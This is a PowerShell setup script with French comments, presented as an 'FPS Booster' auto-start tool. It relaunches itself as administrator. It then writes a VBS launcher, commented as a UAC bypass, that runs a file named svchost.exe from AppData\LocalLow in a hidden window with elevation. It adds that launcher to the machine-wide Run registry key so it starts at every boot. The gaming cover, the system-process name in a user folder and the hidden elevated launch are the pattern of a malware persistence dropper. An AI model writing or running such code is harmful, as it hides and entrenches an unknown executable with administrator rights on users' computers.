# Auto-élévation en admin si pas déjà admin
if (-NOT ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
    Start-Process powershell.exe "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Verb RunAs
    Exit
}

# ========================================
# LOGGING CONFIGURATION
# ========================================
$logFile = "C:\Users\admin1\logssoftware.txt"
function Write-Log {
    param($Message)
    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    $logMessage = "[$timestamp] $Message"
    Add-Content -Path $logFile -Value $logMessage
    Write-Host $Message
}

Write-Log "=========================================="
Write-Log "DEBUT: Setup FPS Booster Auto-Start Admin"
Write-Log "=========================================="
# ========================================

# === CONFIGURATION ===
Write-Host "=== Setup FPS Booster Auto-Start Admin ===" -ForegroundColor Cyan
Write-Host ""

# Chemin du programme avec %userprofile%
$p = "$env:USERPROFILE\AppData\LocalLow\svchost.exe"
Write-Log "Chemin du programme: $p"

# Vérifier que le fichier existe
if (-not (Test-Path $p)) {
    Write-Host "ERREUR: Le fichier n'existe pas!" -ForegroundColor Red
    Write-Host "Chemin: $p" -ForegroundColor Yellow
    Write-Log "ERREUR: Fichier introuvable - $p"
    pause
    Exit
}

Write-Host "Fichier trouve: $p" -ForegroundColor Green
Write-Log "SUCCESS: Fichier trouve"
Write-Host "Configuration en cours..." -ForegroundColor Yellow

# Créer le script VBS pour bypass UAC
$v = "$env:APPDATA\FPSBooster.vbs"
Write-Log "Creation du script VBS: $v"
"Set UAC = CreateObject(""Shell.Application""): UAC.ShellExecute ""$p"", """", """", ""runas"", 0" | Out-File $v -Encoding ASCII -Force

# Ajouter au registre de démarrage
Write-Log "Ajout au registre de demarrage..."
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "FPSBooster" /t REG_SZ /d "wscript.exe ""$v""" /f | Out-Null
Write-Log "SUCCESS: Registre configure"

Write-Host ""
Write-Host "========================================" -ForegroundColor Green
Write-Host "         CONFIGURATION TERMINEE!        " -ForegroundColor Green
Write-Host "========================================" -ForegroundColor Green
Write-Host ""
Write-Host "Ton FPS booster sera maintenant lance en admin" -ForegroundColor Cyan
Write-Host "automatiquement a chaque demarrage de Windows!" -ForegroundColor Cyan
Write-Host ""
Write-Host "Plus besoin de cliquer sur UAC!" -ForegroundColor Yellow
Write-Host ""

# ========================================
# FIN DU LOGGING
# ========================================
Write-Log "=========================================="
Write-Log "FIN: Configuration terminee avec succes"
Write-Log "=========================================="
Write-Log ""
# ========================================

pause
